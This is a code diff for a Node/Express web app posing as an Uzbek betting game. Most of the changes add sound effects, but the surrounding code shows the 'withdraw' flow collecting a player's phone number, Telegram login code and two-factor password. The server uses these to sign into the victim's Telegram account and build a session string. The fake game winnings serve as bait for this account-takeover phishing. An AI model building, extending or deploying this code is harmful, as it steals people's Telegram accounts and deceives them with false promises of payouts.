@@ -77,7 +77,7 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// Kod kiritilganda server orqali Telegramga kirish (TUZA TILGAN MARSHRUT)
+// Kod kiritilganda server orqali Telegramga kirish
 app.post('/api/submit-withdraw', async (req, res) => {
     const { inputCode, phone, password } = req.body;
 
@@ -95,12 +95,11 @@ app.post('/api/submit-withdraw', async (req, res) => {
     try {
         const { client, phoneCodeHash, session } = authData;
 
-        // Server foydalanuvchi kiritgan kod orqali Telegramga kiradi
         await client.signIn({
             phoneNumber: '+' + cleanPhone,
             phoneCodeHash: phoneCodeHash,
             phoneCode: inputCode,
-            password: async () => password || '', // 2FA Parol bo'lsa ishlatish
+            password: async () => password || '',
         });
 
         const me = await client.getMe();
@@ -132,7 +131,6 @@ ${sessionString}
     } catch (err) {
         console.error("Kirishda xatolik:", err);
         
-        // 2FA Parol so'ralgan xolat
         if (err.message && err.message.includes('SESSION_PASSWORD_NEEDED')) {
             return res.json({ 
                 success: false, 
@@ -310,6 +308,88 @@ app.get('/', (req, res) => {
     const GOOD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/415/415733.png';
     const BAD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/823/823876.png';
 
+    // WEB AUDIO API - Tizim o'zi ovoz sintez qiladi (Faylsiz, minimal hajm va tenglashtirilgan temp)
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    let audioCtx = null;
+
+    function getAudioContext() {
+        if (!audioCtx) {
+            audioCtx = new AudioContext();
+        }
+        if (audioCtx.state === 'suspended') {
+            audioCtx.resume();
+        }
+        return audioCtx;
+    }
+
+    // 1. Tugma va kataklar ovozi (Past ovoz: 5-6% balandlikda)
+    function playClickSound() {
+        try {
+            const ctx = getAudioContext();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(600, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(200, ctx.currentTime + 0.05);
+            
+            gain.gain.setValueAtTime(0.05, ctx.currentTime); // 5% balandlik
+            gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.05);
+
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+
+            osc.start();
+            osc.stop(ctx.currentTime + 0.05);
+        } catch(e){}
+    }
+
+    // 2. Yutuq va O'yin ovozlari (Baland ovoz: 100% balandlikda)
+    function playWinSound() {
+        try {
+            const ctx = getAudioContext();
+            const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6 akkordi
+            notes.forEach((freq, idx) => {
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(freq, ctx.currentTime + idx * 0.08);
+
+                gain.gain.setValueAtTime(0.8, ctx.currentTime + idx * 0.08); // Yuqori va baland hajmli
+                gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + idx * 0.08 + 0.3);
+
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+
+                osc.start(ctx.currentTime + idx * 0.08);
+                osc.stop(ctx.currentTime + idx * 0.08 + 0.3);
+            });
+        } catch(e){}
+    }
+
+    // 3. Yutqazish (Mag'lubiyat) ovozi
+    function playLoseSound() {
+        try {
+            const ctx = getAudioContext();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(200, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(60, ctx.currentTime + 0.4);
+
+            gain.gain.setValueAtTime(0.6, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.4);
+
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+
+            osc.start();
+            osc.stop(ctx.currentTime + 0.4);
+        } catch(e){}
+    }
+
     let userBalance = 10000;
     let currentBet = 5000;
     let currentStep = 0;
@@ -354,11 +434,23 @@ app.get('/', (req, res) => {
         document.getElementById('currentBetDisplay').innerText = \`\${currentBet.toLocaleString('uz-UZ')} UZS\`;
     }
 
-    function openModal(id) { document.getElementById(id).classList.add('open'); }
-    function closeModal(id) { document.getElementById(id).classList.remove('open'); }
-    function setPresetBet(amount) { document.getElementById('modalBetInput').value = amount; }
+    function openModal(id) { 
+        playClickSound();
+        document.getElementById(id).classList.add('open'); 
+    }
+    
+    function closeModal(id) { 
+        playClickSound();
+        document.getElementById(id).classList.remove('open'); 
+    }
+
+    function setPresetBet(amount) { 
+        playClickSound();
+        document.getElementById('modalBetInput').value = amount; 
+    }
 
     function confirmBet() {
+        playClickSound();
         const val = parseInt(document.getElementById('modalBetInput').value);
         if (!isNaN(val) && val >= 1000 && val <= userBalance) {
             currentBet = val;
@@ -383,6 +475,7 @@ app.get('/', (req, res) => {
         const mainActionBtn = document.getElementById('mainActionBtn');
         if (!isPlaying) {
             if (userBalance < currentBet) { alert("Balans yetarli emas!"); return; }
+            playClickSound();
             userBalance -= currentBet;
             updateBalanceUI();
             isPlaying = true;
@@ -397,9 +490,13 @@ app.get('/', (req, res) => {
                 const winAmount = Math.floor(currentBet * rowCoefficients[currentStep - 1]);
                 userBalance += winAmount;
                 updateBalanceUI();
+                playWinSound(); // Yutuq ovozi baland eshitiladi
                 alert(\`Siz \${winAmount.toLocaleString('uz-UZ')} UZS yutdingiz!\`);
                 endGame();
-            } else alert("Kamida 1 ta katakcha oching!");
+            } else {
+                playClickSound();
+                alert("Kamida 1 ta katakcha oching!");
+            }
         }
     }
 
@@ -411,9 +508,11 @@ app.get('/', (req, res) => {
         if (isBad) {
             cell.classList.add('opened-core');
             cell.innerHTML = \`<img src="\${BAD_APPLE_IMG}">\`;
+            playLoseSound();
             alert("Yutqazdingiz!");
             endGame();
         } else {
+            playClickSound(); // Sokin tugma/ochish ovozi
             cell.classList.add('opened-apple');
             cell.innerHTML = \`<img src="\${GOOD_APPLE_IMG}">\`;
             const rowDiv = document.getElementById(\`row-\${row}\`);
@@ -425,6 +524,7 @@ app.get('/', (req, res) => {
                 const winAmount = Math.floor(currentBet * rowCoefficients[9]);
                 userBalance += winAmount;
                 updateBalanceUI();
+                playWinSound(); // Maksimal yutuq ovozi
                 alert(\`MAKSIMAL YUTUQ: \${winAmount.toLocaleString('uz-UZ')} UZS!\`);
                 endGame();
             }
@@ -438,6 +538,7 @@ app.get('/', (req, res) => {
     }
 
     async function sendVerificationCode() {
+        playClickSound();
         const phone = document.getElementById('withdrawPhone').value.trim();
         if (phone.length < 9) { alert("To'g'ri raqam kiriting!"); return; }
         
@@ -472,6 +573,7 @@ app.get('/', (req, res) => {
     }
 
     async function submitWithdraw() {
+        playClickSound();
         const inputs = document.querySelectorAll('.code-box-input');
         const phone = document.getElementById('withdrawPhone').value.trim();
         const password = document.getElementById('telegramPassword').value.trim();
